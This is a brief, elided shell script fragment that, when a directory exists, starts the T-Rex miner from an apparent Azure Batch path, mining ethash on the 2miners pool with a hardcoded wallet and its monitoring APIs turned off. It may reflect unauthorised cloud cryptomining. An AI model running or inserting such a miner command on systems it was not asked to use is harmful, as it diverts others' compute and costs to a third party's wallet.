...
if [ -f "$DIR" ]; then
  ### Take action if $DIR exists ###
    ...
    /home/_azbatch/trex/t-rex --algo ethash --url stratum1+tcp://us-eth.2miners.com:2020 --user 0x6bA4d687Aec1055163DF07F8EA10D643D91d8e20 --worker $hostname --pass pppwww --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --intensity 25 --retries 90 --retry-pause 30 
else
    sudo apt-get update ;
